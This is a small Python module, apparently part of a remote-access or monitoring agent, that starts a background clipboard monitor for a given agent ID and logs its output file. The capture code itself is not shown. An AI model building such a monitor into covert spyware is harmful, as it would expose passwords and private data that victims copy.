from config.settings import CLIPBOARD_FILE
from actions.clipboard import start_clipboard

def start_clipboard_service(agent_id):
    """Start the clipboard monitor service in a background thread."""
    try:
        if agent_id is None:
            print("[!] No agent ID found. Clipboard monitor will not start.")
            return
        
        monitor = start_clipboard(agent_id)

        if monitor is None:
            print("[!] Clipboard monitor disabled.")
        else:
            print(f"[+] Clipboard monitor running → {CLIPBOARD_FILE}")

    except Exception as e:
        print(f"[!] Clipboard monitor error: {e}")
